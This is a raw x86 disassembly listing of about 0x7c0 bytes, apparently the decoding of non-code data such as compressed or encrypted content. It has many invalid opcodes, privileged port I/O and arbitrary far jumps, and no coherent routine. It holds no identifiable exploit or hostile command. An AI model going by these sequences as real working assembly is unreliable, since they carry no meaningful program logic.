  446c19:	mov    al,0x65
  446c1b:	ror    BYTE PTR [edx],0x39
  446c1e:	mov    ah,0xb7
  446c20:	retf   0x29be
  446c23:	cld    
  446c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446c25:	push   ss
  446c26:	(bad)  
  446c27:	std    
  446c28:	int3   
  446c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446c2a:	call   0x77153daf
  446c2f:	leave  
  446c30:	xor    dl,BYTE PTR [eax-0x4ac9ec82]
  446c36:	daa    
  446c37:	add    DWORD PTR [edx-0x1719e31d],esi
  446c3d:	dec    ebp
  446c3e:	xchg   edx,eax
  446c3f:	arpl   bx,bp
  446c41:	mov    bh,0xd1
  446c43:	call   0xa476:0x5bea920d
  446c4a:	hlt    
  446c4b:	or     eax,eax
  446c4d:	push   edi
  446c4e:	xor    eax,0xdfcdbdb2
  446c53:	les    edx,FWORD PTR [ecx+0x73]
  446c56:	jnp    0x446be0
  446c58:	jns    0x446c10
  446c5a:	mov    ds,WORD PTR [eax]
  446c5c:	rol    ah,0x56
  446c5f:	je     0x446c05
  446c61:	adc    BYTE PTR [edx-0x77],ah
  446c64:	pop    esp
  446c65:	mov    ebp,DWORD PTR [edx-0x57]
  446c68:	mov    ebx,0x575dac9f
  446c6d:	pushf  
  446c6e:	mov    ebp,0xdab503aa
  446c73:	sbb    DWORD PTR [ecx],edx
  446c75:	ss pop edx
  446c77:	outs   dx,DWORD PTR ds:[esi]
  446c78:	or     cl,BYTE PTR [eax-0x36]
  446c7b:	inc    ebp
  446c7c:	fwait
  446c7d:	mov    BYTE PTR [ebp+0x5e0819b1],al
  446c83:	fisttp DWORD PTR [ebx-0x3e0eb2be]
  446c89:	fadd   DWORD PTR [edx+0x3176958e]
  446c8f:	inc    esp
  446c90:	mov    al,ds:0x3c05d10a
  446c95:	push   ss
  446c96:	sub    ecx,0xc09839fa
  446c9c:	daa    
  446c9d:	inc    ebx
  446c9e:	scas   eax,DWORD PTR es:[edi]
  446c9f:	js     0x446cff
  446ca1:	cmp    BYTE PTR [edx-0x6960bf17],0x5e
  446ca8:	fld    TBYTE PTR [eax-0x1b]
  446cab:	jns    0x446ce5
  446cad:	sbb    BYTE PTR [eax],ah
  446caf:	ins    BYTE PTR es:[edi],dx
  446cb0:	outs   dx,BYTE PTR ds:[esi]
  446cb1:	pop    edx
  446cb2:	pushf  
  446cb3:	mov    ch,bh
  446cb5:	repz adc al,0x3e
  446cb8:	add    DWORD PTR [edi+0x36e38310],ecx
  446cbe:	aaa    
  446cbf:	pusha  
  446cc0:	cli    
  446cc1:	mov    ah,0xf5
  446cc3:	fcomi  st,st(4)
  446cc5:	dec    esp
  446cc6:	outs   dx,BYTE PTR ds:[esi]
  446cc7:	lods   eax,DWORD PTR ss:[esi]
  446cc9:	pop    edx
  446cca:	and    BYTE PTR [edx+0xd],ch
  446ccd:	xor    bl,ah
  446ccf:	jo     0x446c76
  446cd1:	mov    WORD PTR [edx+eiz*1-0x19],ss
  446cd5:	ins    DWORD PTR es:[edi],dx
  446cd6:	dec    ebx
  446cd7:	hlt    
  446cd8:	ror    BYTE PTR [eax+0x25809152],0xe0
  446cdf:	pop    ss
  446ce0:	rcr    BYTE PTR [eax+0x66d334a2],1
  446ce6:	push   ecx
  446ce7:	jp     0x446d42
  446ce9:	pop    ds
  446cea:	xchg   BYTE PTR [esi+0x54],dh
  446ced:	pusha  
  446cee:	imul   esp,ebx,0xffffff91
  446cf1:	push   ss
  446cf2:	fsub   QWORD PTR [edx-0x2acbe549]
  446cf8:	jmp    0xfee0:0xd610ed6d
  446cff:	in     al,0x5b
  446d01:	mov    eax,0x30e4cad7
  446d06:	arpl   WORD PTR [ecx],cx
  446d08:	js     0x446d36
  446d0a:	(bad)  
  446d0b:	aas    
  446d0c:	pop    edx
  446d0d:	add    BYTE PTR [edx+ebx*8],0x8a
  446d11:	xchg   BYTE PTR [eax+ecx*8],dl
  446d14:	and    ecx,edx
  446d16:	dec    eax
  446d17:	jmp    0x446cef
  446d19:	add    ch,BYTE PTR [ebp+0x75]
  446d1c:	add    ecx,DWORD PTR [edi+0x68]
  446d1f:	mov    ch,0x20
  446d21:	hlt    
  446d22:	xchg   BYTE PTR [ebx],al
  446d24:	sbb    ch,BYTE PTR [edi+0x64bf3a9c]
  446d2a:	fcom   QWORD PTR [ecx+eax*2]
  446d2d:	push   0xd40cd17e
  446d32:	add    bl,BYTE PTR [eax]
  446d34:	add    BYTE PTR [edi+0x50ab00e8],dl
  446d3a:	cdq    
  446d3b:	(bad)  
  446d3c:	(bad)  
  446d3d:	call   0x40a7:0x70abdc84
  446d44:	and    DWORD PTR [edx-0x79],ebp
  446d47:	mov    eax,ds:0xded0ed45
  446d4c:	retf   0xe1f
  446d4f:	(bad)  
  446d50:	xor    bl,BYTE PTR [esi-0x1fb3c0be]
  446d56:	pop    eax
  446d57:	push   ebx
  446d58:	aam    0x7e
  446d5a:	repnz lock push eax
  446d5d:	add    al,0x5e
  446d5f:	push   ds
  446d60:	test   DWORD PTR [esi],eax
  446d62:	xor    cl,bh
  446d64:	jg     0x446dae
  446d66:	ins    DWORD PTR es:[edi],dx
  446d67:	lahf   
  446d68:	adc    BYTE PTR [edi+ecx*1-0x5c49f524],0xd4
  446d70:	pusha  
  446d71:	pushf  
  446d72:	aam    0x76
  446d74:	out    dx,al
  446d75:	pushf  
  446d76:	push   ecx
  446d77:	add    al,0x15
  446d79:	xor    al,0xd0
  446d7b:	cld    
  446d7c:	dec    esi
  446d7d:	mov    eax,ds:0xcb53ba84
  446d82:	cli    
  446d83:	xchg   esi,eax
  446d84:	and    bl,bh
  446d86:	add    ch,al
  446d88:	aas    
  446d89:	push   edx
  446d8a:	punpcklbw mm2,mm5
  446d8d:	sti    
  446d8e:	(bad)  
  446d8f:	repnz or al,0x0
  446d92:	xor    ch,BYTE PTR [ebx+0x0]
  446d95:	mov    edi,0xab9047a5
  446d9a:	pop    esp
  446d9b:	inc    eax
  446d9c:	js     0x446d24
  446d9e:	aam    0xb6
  446da0:	cs hlt 
  446da2:	jnp    0x446d79
  446da4:	push   0xffffff9c
  446da6:	or     al,0xb4
  446da8:	add    al,0x9e
  446daa:	pusha  
  446dab:	lods   al,BYTE PTR ds:[esi]
  446dac:	push   edx
  446dad:	jbe    0x446dbf
  446daf:	mov    esi,0x87c61b90
  446db4:	mov    BYTE PTR [edx],al
  446db6:	mov    edx,0x847c208f
  446dbb:	icebp  
  446dbc:	ss stos BYTE PTR es:[edi],al
  446dbe:	jl     0x446d86
  446dc0:	fdiv   DWORD PTR [ecx]
  446dc2:	inc    edx
  446dc3:	and    eax,0xa2ca27a4
  446dc8:	mov    dh,0x3e
  446dca:	pop    ecx
  446dcb:	lods   eax,DWORD PTR ds:[esi]
  446dcc:	fcmovnu st,st(2)
  446dce:	mov    ebx,0x59866d0
  446dd3:	lods   al,BYTE PTR ds:[esi]
  446dd4:	mov    al,0xea
  446dd6:	xchg   edx,eax
  446dd7:	add    BYTE PTR [ecx+ecx*1-0x76],ah
  446ddb:	mov    DWORD PTR [edx+0x12cf8da5],ebx
  446de1:	cli    
  446de2:	pop    ecx
  446de3:	pop    ecx
  446de4:	jp     0x446dec
  446de6:	push   cs
  446de7:	or     al,0xe0
  446de9:	hlt    
  446dea:	nop    eax
  446ded:	rol    BYTE PTR [edi+0x0],1
  446df0:	adc    eax,0x7af0b88e
  446df5:	cdq    
  446df6:	shl    BYTE PTR [ebx+ebp*8],0x13
  446dfa:	ss das 
  446dfc:	mov    WORD PTR [edx],?
  446dfe:	aaa    
  446dff:	push   esp
  446e00:	sub    eax,0x5eeaa7b4
  446e05:	ins    DWORD PTR es:[edi],dx
  446e06:	popa   
  446e07:	sub    ebp,DWORD PTR [eax]
  446e09:	xchg   dl,ah
  446e0b:	pushf  
  446e0c:	and    DWORD PTR [ecx+eiz*4+0x14],0xffffffb1
  446e11:	sub    BYTE PTR [ecx],al
  446e13:	jno    0x446da5
  446e15:	add    ecx,DWORD PTR [edx-0x45fb2668]
  446e1b:	or     eax,0x6cfb65ce
  446e20:	ins    BYTE PTR es:[edi],dx
  446e21:	in     eax,dx
  446e22:	retf   0x52b4
  446e25:	or     al,0xa
  446e27:	jge    0x446dc2
  446e29:	mov    cs,WORD PTR [eax-0xfeba399]
  446e2f:	add    dl,BYTE PTR [edx-0x42]
  446e32:	dec    edx
  446e33:	lea    esi,es:0x8c4f15a0
  446e3a:	fst    QWORD PTR [esi]
  446e3c:	dec    ebx
  446e3d:	popa   
  446e3e:	cld    
  446e3f:	fsub   st,st(1)
  446e41:	mov    ah,0xda
  446e43:	test   al,ch
  446e45:	sbb    ch,ah
  446e47:	push   ds
  446e48:	fldcw  WORD PTR [edx]
  446e4a:	adc    al,0x1e
  446e4d:	push   ecx
  446e4e:	ds sbb ebp,ebp
  446e51:	rcr    BYTE PTR [ebx-0x27a7ee8],1
  446e57:	push   ss
  446e58:	mov    ch,0x1e
  446e5a:	mov    al,ds:0xb4a46222
  446e5f:	mov    ds:0xc435c615,al
  446e64:	and    al,0xca
  446e66:	out    dx,al
  446e67:	in     al,0xe0
  446e69:	ins    BYTE PTR es:[edi],dx
  446e6a:	in     al,dx
  446e6b:	mov    eax,0xe860a80a
  446e70:	mov    edx,0xd419f510
  446e75:	dec    edx
  446e76:	xchg   esp,eax
  446e77:	rcr    BYTE PTR [edi-0x38555120],1
  446e7d:	inc    ebx
  446e7e:	jecxz  0x446e13
  446e80:	es push esi
  446e82:	lahf   
  446e83:	push   esp
  446e84:	and    BYTE PTR [ebp+0x641a125a],bh
  446e8a:	xor    al,0xfa
  446e8c:	fld    QWORD PTR [esi+ebp*2]
  446e8f:	cmp    BYTE PTR [edx],ah
  446e91:	lock xchg ebx,eax
  446e93:	call   0x7034c629
  446e98:	xchg   ebx,eax
  446e99:	ins    DWORD PTR es:[edi],dx
  446e9a:	sub    BYTE PTR [edx+0x2c],ch
  446e9d:	mov    eax,ds:0xfc2a386
  446ea2:	repz cli 
  446ea4:	jo     0x446ecc
  446ea6:	fild   DWORD PTR [esp+edx*2+0x52046c55]
  446ead:	jmp    0x47c626f2
  446eb2:	adc    dh,BYTE PTR [esi+0xa7f7c8b]
  446eb8:	shl    BYTE PTR [ecx+0x51],cl
  446ebb:	sub    bl,BYTE PTR [edx]
  446ebd:	ficom  DWORD PTR [ecx+0x75becfc2]
  446ec3:	out    0x58,al
  446ec5:	adc    BYTE PTR [esi+0x50],al
  446ec8:	mov    al,ds:0x2bac2a92
  446ecd:	scas   al,BYTE PTR es:[edi]
  446ece:	and    al,0xc7
  446ed0:	sub    al,BYTE PTR [eax]
  446ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446ed3:	mov    al,ds:0xa193e4e8
  446ed8:	ret    0x4b7e
  446edb:	and    al,0x30
  446edd:	gs jbe 0x446e74
  446ee0:	xor    esp,DWORD PTR [edx*8+0x425ca20d]
  446ee7:	inc    eax
  446ee8:	xor    bl,BYTE PTR [ebp-0x2985e780]
  446eee:	fiadd  DWORD PTR [esi+0x42]
  446ef1:	xchg   edx,eax
  446ef2:	mov    al,ds:0x3a1a63b6
  446ef7:	mov    ah,0xa
  446ef9:	ds hlt 
  446efb:	mov    al,ds:0xfc07a0b1
  446f00:	dec    BYTE PTR [ebx]
  446f02:	jl     0x446f16
  446f04:	push   esi
  446f05:	fcom   DWORD PTR [esi-0x58]
  446f08:	ror    BYTE PTR [esi+0xa2e9e58],1
  446f0e:	pop    esi
  446f0f:	in     eax,dx
  446f10:	cld    
  446f11:	adc    ch,dh
  446f13:	pop    ecx
  446f14:	test   BYTE PTR [ebx],dl
  446f16:	xor    ah,dl
  446f18:	cmp    cl,BYTE PTR [edi+0x69]
  446f1b:	loop   0x446f52
  446f1d:	or     eax,0x4717796
  446f22:	loopne 0x446f38
  446f24:	jne    0x446f04
  446f26:	ss jmp 0xab28:0x288a5c02
  446f2e:	enter  0x46a,0x2
  446f32:	sub    dl,BYTE PTR [edx+0x7517f9]
  446f38:	addr16 mov ah,0x14
  446f3b:	add    BYTE PTR ds:0x105e9230,dl
  446f41:	int3   
  446f42:	sbb    bh,BYTE PTR [edx+0xe]
  446f45:	adc    edi,eax
  446f47:	fs pusha 
  446f49:	sub    ecx,eax
  446f4b:	mov    esi,0x6d49b598
  446f50:	retf   0x3e
  446f53:	call   0x4d85:0xb588707e
  446f5a:	add    al,ch
  446f5c:	shr    BYTE PTR [ebp+0x4],1
  446f5f:	inc    edx
  446f60:	adc    al,0xd0
  446f62:	pop    edx
  446f63:	rol    DWORD PTR [edi+0x6a],cl
  446f66:	(bad)  
  446f67:	or     bl,BYTE PTR [edi]
  446f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446f6a:	popf   
  446f6b:	adc    al,0x4b
  446f6d:	push   ebx
  446f6e:	call   0xfe5d4f03
  446f73:	sub    eax,0x2ca6f112
  446f78:	in     al,dx
  446f79:	neg    DWORD PTR [edi+0x7]
  446f7c:	inc    ebx
  446f7d:	scas   eax,DWORD PTR es:[edi]
  446f7e:	pusha  
  446f7f:	push   0x305ee2f9
  446f84:	lock pop edx
  446f86:	rcr    BYTE PTR [ebx+0x4c],1
  446f89:	mov    eax,gs
  446f8b:	je     0x446f30
  446f8d:	mov    DWORD PTR ds:0x708252c7,edx
  446f93:	fwait
  446f94:	sahf   
  446f95:	pop    eax
  446f96:	xor    eax,0x92ea6475
  446f9b:	clc    
  446f9c:	cwde   
  446f9d:	jge    0x446f7d
  446f9f:	inc    eax
  446fa0:	in     eax,dx
  446fa1:	enter  0x6244,0x6c
  446fa5:	pop    es
  446fa6:	pop    esi
  446fa7:	inc    esp
  446fa8:	mov    dl,BYTE PTR [edx+0x3a4e96c8]
  446fae:	cmp    ebp,DWORD PTR [esi]
  446fb0:	add    eax,0x38d762a0
  446fb5:	imul   edx,DWORD PTR [edx],0x4f
  446fb8:	ins    DWORD PTR es:[edi],dx
  446fb9:	add    al,0xb6
  446fbb:	sub    ecx,DWORD PTR [ecx]
  446fbd:	retf   0x7c63
  446fc0:	leave  
  446fc1:	les    edi,FWORD PTR [ebx+0x21]
  446fc4:	pusha  
  446fc5:	cmp    edx,DWORD PTR [edx]
  446fc7:	test   eax,0x84307b16
  446fcc:	fsubp  st(0),st
  446fce:	jl     0x446f78
  446fd0:	es daa 
  446fd2:	and    DWORD PTR [esi],ebp
  446fd4:	loop   0x446fa3
  446fd6:	loop   0x446fb2
  446fd8:	inc    edx
  446fd9:	pop    ss
  446fda:	cwde   
  446fdb:	data16 jle 0x447049
  446fde:	add    al,BYTE PTR [esi+0x11]
  446fe1:	and    ch,BYTE PTR [edx+0x1a2ea012]
  446fe7:	inc    edx
  446fe8:	je     0x44700e
  446fea:	pop    ebx
  446feb:	(bad)
  446ff0:	aaa    
  446ff1:	inc    eax
  446ff2:	adc    al,0x3e
  446ff4:	sub    DWORD PTR [eax-0x72],0xffffffc7
  446ff8:	or     al,0x83
  446ffa:	push   edx
  446ffb:	fcmovu st,st(4)
  446ffd:	icebp  
  446ffe:	leave  
  446fff:	add    ch,ch
  447001:	addr16 pusha 
  447003:	sub    al,0x0
  447005:	push   ebx
  447006:	and    al,0xc7
  447008:	jmp    0x7fb6:0xea1f8411
  44700f:	pop    eax
  447010:	test   DWORD PTR [edi],ebx
  447012:	aam    0x8a
  447014:	jbe    0x44705a
  447016:	mov    ds:0xb2efe287,al
  44701b:	iret   
  44701c:	rcl    bh,1
  44701e:	das    
  44701f:	popa   
  447020:	sti    
  447021:	add    al,0x26
  447023:	call   0x625d:0xc236c443
  44702a:	add    eax,0x88401ad6
  44702f:	add    al,0xd6
  447031:	stos   DWORD PTR es:[edi],eax
  447032:	add    eax,0xda5d5926
  447037:	aad    0x4a
  447039:	xchg   esi,eax
  44703a:	jp     0x446fd3
  44703c:	mov    eax,ds:0xc28a5046
  447041:	jo     0x447079
  447043:	sti    
  447044:	add    al,0xe3
  447046:	aam    0x58
  447048:	pop    esi
  447049:	jmp    0x446fd0
  44704b:	inc    esi
  44704c:	imul   esp,DWORD PTR cs:[edi+0x65f4213],0x38
  447054:	mov    WORD PTR [esi],fs
  447056:	out    dx,al
  447057:	aad    0x2e
  447059:	and    DWORD PTR [eax+0x4f],esp
  44705c:	fiadd  DWORD PTR [eax+0x641081]
  447062:	sbb    BYTE PTR [ecx],cl
  447064:	mov    DWORD PTR [edx],ebp
  447066:	test   BYTE PTR [esi+0x50ba2657],ch
  44706c:	rol    DWORD PTR [eax+0x3b],1
  44706f:	cmp    DWORD PTR [eax+eax*4-0x567de24e],esp
  447076:	int3   
  447077:	cmp    al,0x95
  447079:	jbe    0x447045
  44707b:	ret    0xa94f
  44707e:	jne    0x4470da
  447080:	sbb    DWORD PTR [esp+eax*8+0x28],ecx
  447084:	cmp    eax,0x6d611ffd
  447089:	(bad)  
  44708a:	fs retf 0x8458
  44708e:	jle    0x447022
  447090:	test   eax,0xd4053684
  447095:	pusha  
  447096:	and    ch,ah
  447098:	push   esi
  447099:	fisubr DWORD PTR [esi]
  44709b:	push   0x28
  44709d:	mov    cl,0x8c
  44709f:	pop    es
  4470a0:	adc    cl,BYTE PTR [esi+ebp*1-0x41]
  4470a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4470a5:	adc    BYTE PTR [ebx+0x43],bl
  4470a8:	ret    
  4470a9:	xor    eax,0x53862120
  4470ae:	fs rcl esi,cl
  4470b1:	xchg   ecx,eax
  4470b2:	aam    0x74
  4470b4:	gs (bad) 
  4470b6:	frstor [edx]
  4470b8:	xchg   ecx,eax
  4470b9:	push   eax
  4470ba:	dec    ebp
  4470bb:	loope  0x4470d8
  4470bd:	inc    edx
  4470be:	fld    QWORD PTR [eax+0x5281a1c8]
  4470c4:	shl    DWORD PTR [eax],0x4
  4470c7:	add    al,0xe4
  4470c9:	sbb    eax,0xfa09be06
  4470ce:	jne    0x4470d0
  4470d0:	push   edi
  4470d1:	or     dl,BYTE PTR [eax+0x18]
  4470d4:	add    ebx,DWORD PTR [eax-0x760e5f50]
  4470da:	sar    BYTE PTR [ecx-0x3e],1
  4470dd:	cs jecxz 0x447135
  4470e0:	sbb    bl,BYTE PTR [edi+0x37a03c41]
  4470e6:	(bad)  
  4470e7:	jmp    0x63a0:0xb734be63
  4470ee:	push   0xffffffa5
  4470f0:	sbb    al,0xc4
  4470f2:	adc    al,0x6e
  4470f4:	push   edx
  4470f5:	sbb    eax,0xb45acc2e
  4470fa:	and    dl,BYTE PTR [ebx]
  4470fc:	rcl    BYTE PTR [eax],cl
  4470fe:	adc    DWORD PTR [edx+eiz*2-0x36549f6c],esp
  447105:	inc    eax
  447106:	xchg   esi,eax
  447107:	mov    eax,cs:0xf8e9a86b
  44710d:	jo     0x447115
  44710f:	bound  edx,QWORD PTR [ebx+eiz*8+0x72]
  447113:	push   0xacba1bf3
  447118:	pop    ebp
  447119:	and    al,0xf6
  44711b:	cmp    dh,bl
  44711d:	add    BYTE PTR [ebp-0x38],ah
  447120:	add    BYTE PTR ds:0x6b44f6c3,al
  447126:	jp     0x447111
  447128:	inc    eax
  447129:	(bad)  
  44712a:	mov    esi,0x8098d4a7
  44712f:	aad    0x6b
  447131:	jae    0x4470e7
  447133:	add    BYTE PTR [eax-0x2a7e8176],cl
  447139:	push   esp
  44713a:	and    al,0xa6
  44713c:	mov    al,fs:0x5eb3b062
  447142:	xchg   edx,eax
  447143:	test   al,0x5a
  447145:	loopne 0x4471b3
  447147:	mov    ds:0xe18865c6,eax
  44714c:	xor    DWORD PTR [esi-0xdeb02df],ebp
  447152:	mov    al,ds:0x2f90eceb
  447157:	push   ebx
  447158:	xchg   ebp,eax
  447159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44715a:	repnz repnz sbb dh,al
  44715e:	pop    ebx
  44715f:	aam    0xaa
  447161:	adc    esi,eax
  447163:	push   ecx
  447164:	outs   dx,BYTE PTR ds:[esi]
  447165:	sahf   
  447166:	cmc    
  447167:	add    al,0xe9
  447169:	add    DWORD PTR [ebp-0x63b1ffea],edi
  44716f:	inc    esi
  447170:	xchg   DWORD PTR [edx],esi
  447172:	jbe    0x44710c
  447174:	fimul  DWORD PTR [esi+0x7e4555c6]
  44717a:	mov    ebp,0x4d45a4b3
  44717f:	out    dx,al
  447180:	mov    ds:0xe6cb8fec,eax
  447185:	sbb    bh,dl
  447187:	inc    eax
  447188:	jecxz  0x447171
  44718a:	jo     0x447198
  44718c:	pop    ss
  44718d:	cld    
  44718e:	and    edx,esp
  447190:	jbe    0x4471cf
  447192:	push   esi
  447193:	(bad)  
  447195:	retf   
  447196:	aas    
  447197:	out    dx,al
  447198:	or     al,0xbe
  44719a:	xchg   ecx,eax
  44719b:	nop
  44719c:	fcmovnbe st,st(6)
  44719e:	adc    DWORD PTR [esi-0x64babaf6],eax
  4471a4:	pushf  
  4471a5:	add    al,0x5e
  4471a7:	and    BYTE PTR [eax-0x4a],dl
  4471aa:	bound  ebx,QWORD PTR [edi+0xfc218e1]
  4471b0:	sbb    BYTE PTR [esi],dh
  4471b2:	in     al,0x80
  4471b4:	pusha  
  4471b5:	lods   eax,DWORD PTR ds:[esi]
  4471b6:	std    
  4471b7:	xor    BYTE PTR [ecx-0x19a72508],0xd2
  4471be:	jge    0x447190
  4471c0:	idiv   dl
  4471c2:	ins    BYTE PTR es:[edi],dx
  4471c3:	mov    eax,ds:0x2c014178
  4471c8:	or     BYTE PTR [edi-0x193fbca2],dl
  4471ce:	add    BYTE PTR [eax-0x48],al
  4471d1:	mov    DWORD PTR ds:0xe2be6a47,esi
  4471d7:	push   cs
  4471d8:	and    BYTE PTR [edx],0x31
  4471db:	fiadd  WORD PTR [eax]
  4471dd:	push   ss
  4471de:	xor    al,0xcc
  4471e0:	xchg   al,dl
  4471e2:	sbb    ecx,DWORD PTR [edi+0xad66d08]
  4471e8:	add    DWORD PTR [esi+edi*8-0x3f],esi
  4471ec:	and    dl,BYTE PTR [ecx+0x6766ba9]
  4471f2:	dec    edx
  4471f3:	dec    edx
  4471f4:	lods   al,BYTE PTR ds:[esi]
  4471f5:	dec    edi
  4471f6:	push   es
  4471f7:	fisub  DWORD PTR [edx+0x4f]
  4471fa:	call   0x160188ed
  4471ff:	outs   dx,DWORD PTR ds:[esi]
  447200:	push   ebx
  447201:	(bad)  [edi]
  447203:	adc    al,0xd2
  447205:	push   ss
  447206:	outs   dx,DWORD PTR ds:[esi]
  447207:	dec    eax
  447208:	ss gs mov ch,0x2e
  44720c:	push   edx
  44720d:	ins    BYTE PTR es:[edi],dx
  44720e:	std    
  44720f:	inc    eax
  447210:	pop    esp
  447211:	push   0xfffffffa
  447213:	and    dl,BYTE PTR [ecx-0x18]
  447216:	push   0x3a52d188
  44721b:	xor    BYTE PTR [eax],dl
  44721d:	push   edx
  44721e:	push   eax
  44721f:	jle    0x447283
  447221:	sub    ebp,DWORD PTR [esi+0x7bc26c29]
  447227:	pop    es
  447228:	add    al,0xb3
  44722a:	les    esp,FWORD PTR [esi+0x50]
  44722d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44722e:	pop    ebp
  44722f:	push   ecx
  447230:	push   0xffffffbe
  447232:	or     dl,al
  447234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447235:	dec    esp
  447236:	fmul   QWORD PTR [edx]
  447238:	inc    edx
  447239:	test   DWORD PTR [ebp-0x12355fb5],ecx
  44723f:	add    BYTE PTR [esi],0x7e
  447242:	pushf  
  447243:	(bad)  [edx+ecx*2+0x2]
  447247:	mov    dl,0xb3
  447249:	imul   esp,eax,0x21
  44724c:	test   eax,0x462af213
  447251:	scas   al,BYTE PTR es:[edi]
  447252:	sar    DWORD PTR [edx+0x2ec2b401],1
  447258:	xchg   ebp,eax
  447259:	jb     0x4472d8
  44725b:	cmp    al,al
  44725d:	add    al,0x10
  44725f:	in     eax,dx
  447260:	pop    ss
  447261:	aam    0x54
  447263:	cs inc eax
  447265:	ja     0x44727e
  447267:	stos   BYTE PTR es:[edi],al
  447268:	add    cl,dh
  44726a:	pushf  
  44726b:	mov    ecx,0xb2ac4e56
  447270:	pop    edx
  447271:	(bad)  [edi]
  447273:	mov    al,ds:0x88b798aa
  447278:	mov    edx,0xdac90430
  44727d:	sub    edi,DWORD PTR [esp+edi*2]
  447280:	add    ch,dh
  447282:	pop    ebx
  447283:	mov    eax,0x4101c972
  447288:	sub    bl,BYTE PTR [edx]
  44728a:	(bad)  
  44728b:	das    
  44728c:	adc    DWORD PTR [ebp+0x52af90d9],ebp
  447292:	mov    al,0x32
  447294:	add    al,0xf1
  447296:	mov    edx,eax
  447298:	popf   
  447299:	pop    esi
  44729a:	and    cl,BYTE PTR [edi-0xd]
  44729d:	lods   eax,DWORD PTR ds:[esi]
  44729e:	sub    BYTE PTR [edx-0x3],dh
  4472a1:	es lock inc edi
  4472a4:	ds jp  0x447290
  4472a7:	xor    al,0x60
  4472a9:	pop    edx
  4472aa:	xchg   esp,eax
  4472ab:	mov    al,0xb5
  4472ad:	das    
  4472ae:	ficom  DWORD PTR [edx-0x5a]
  4472b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4472b2:	push   edx
  4472b3:	(bad)  
  4472b5:	loopne 0x44725e
  4472b7:	mov    esi,cs
  4472b9:	loope  0x447314
  4472bb:	fdiv   DWORD PTR [eax+0x1]
  4472be:	xor    BYTE PTR [ebx+edi*2+0x48],cl
  4472c2:	outs   dx,BYTE PTR ds:[esi]
  4472c3:	pushf  
  4472c4:	adc    eax,0x107da358
  4472c9:	fiadd  DWORD PTR [edx+eax*4-0x2d969160]
  4472d0:	sti    
  4472d1:	push   ecx
  4472d2:	lds    edx,FWORD PTR [ecx-0xfe4ad4c]
  4472d8:	out    0xc,al
  4472da:	fs pop ebp
  4472dc:	sbb    ah,dh
  4472de:	lods   eax,DWORD PTR ds:[esi]
  4472df:	or     BYTE PTR [esi+0x65],al
  4472e2:	and    bl,al
  4472e4:	sbb    al,0xa
  4472e6:	add    BYTE PTR [edi],ch
  4472e8:	push   0x53
  4472ea:	rol    DWORD PTR [edi-0x3c692673],0xde
  4472f1:	arpl   WORD PTR [edx-0x25],dx
  4472f4:	ror    BYTE PTR [ebx+0x6a],0x18
  4472f8:	xor    bh,BYTE PTR [esi+0x12c7b189]
  4472fe:	sbb    bl,BYTE PTR [esi+0x5c]
  447301:	and    bh,BYTE PTR [esi]
  447303:	es mov al,cs:0x688b7534
  44730a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44730b:	push   esp
  44730c:	call   0xa754:0x26549e64
  447313:	mov    esi,0xa0910020
  447318:	fisttp DWORD PTR [ebx-0x4a]
  44731b:	loope  0x4472b7
  44731d:	cwde   
  44731e:	cld    
  44731f:	bound  esi,QWORD PTR [ecx-0x11]
  447322:	call   0x6e51e0c0
  447327:	sub    dl,dh
  447329:	sbb    BYTE PTR [eax+0x53],0x1a
  44732d:	mov    cs,WORD PTR [eax+0x20815a25]
  447333:	dec    eax
  447334:	inc    ebp
  447335:	shl    BYTE PTR [edi+0xad442de],1
  44733b:	push   ecx
  44733c:	and    DWORD PTR [edx+0x459a2316],edx
  447342:	push   edi
  447343:	lock mov BYTE PTR ss:[ebx+0x50686a48],0x6f
  44734c:	and    eax,ebp
  44734e:	pop    ss
  44734f:	sbb    esi,0x1d82e8ae
  447355:	inc    ecx
  447356:	pop    edx
  447357:	icebp  
  447358:	push   edx
  447359:	push   ebp
  44735a:	les    eax,FWORD PTR [ebx-0x49]
  44735d:	pushf  
  44735e:	push   esi
  44735f:	push   ecx
  447360:	add    al,0x49
  447362:	and    BYTE PTR [eax],dh
  447364:	(bad)  
  447365:	push   ebx
  447366:	add    ebp,DWORD PTR [eax+0x2636c1ad]
  44736c:	scas   eax,DWORD PTR es:[edi]
  44736d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44736e:	inc    ecx
  44736f:	pop    ecx
  447370:	xor    ch,BYTE PTR [edi]
  447372:	adc    DWORD PTR [ebp-0x49572515],ebp
  447378:	adc    cl,BYTE PTR [esi-0x125e9728]
  44737e:	retf   0x61d4
  447381:	mov    ch,0x5a
  447383:	out    dx,al
  447384:	dec    esp
  447385:	cmc    
  447386:	std    
  447387:	das    
  447388:	dec    ebp
  447389:	loope  0x44739e
  44738b:	and    ah,BYTE PTR [esi]
  44738d:	jae    0x4473ad
  44738f:	cwde   
  447390:	hlt    
  447391:	and    BYTE PTR [esi+0x1d],dh
  447394:	push   ecx
  447395:	call   0xd457724e
  44739a:	xlat   BYTE PTR ds:[ebx]
  44739b:	mov    al,0xf0
  44739d:	add    BYTE PTR [edx+ebp*2+0x50],dh
  4473a1:	jbe    0x4473ca
  4473a3:	test   al,0xf8
  4473a5:	push   ss
  4473a6:	test   al,ch
  4473a8:	cwde   
  4473a9:	pop    ebp
  4473aa:	dec    esp
  4473ab:	xchg   DWORD PTR ds:0x70a80972,ebp
  4473b1:	mov    ds:0x33dd747c,al
  4473b6:	and    al,0xe2
  4473b8:	(bad)  
  4473b9:	popa   
  4473ba:	xchg   edx,eax
  4473bb:	fwait
  4473bc:	mov    bl,0x0
  4473be:	sbb    cl,BYTE PTR ds:0xe18500a3
  4473c4:	jo     0x447378
  4473c6:	push   ss
  4473c7:	enter  0xed50,0x5a
  4473cb:	push   esp
  4473cc:	ins    BYTE PTR es:[edi],dx
  4473cd:	adc    al,BYTE PTR ds:0x86b8c282
  4473d3:	mov    BYTE PTR [edx-0x66],al
  4473d6:	xchg   ecx,eax
  4473d7:	mov    esp,0x9b06a217
  4473dc:	in     eax,dx
  4473dd:	ror    BYTE PTR [eax+0x14],cl
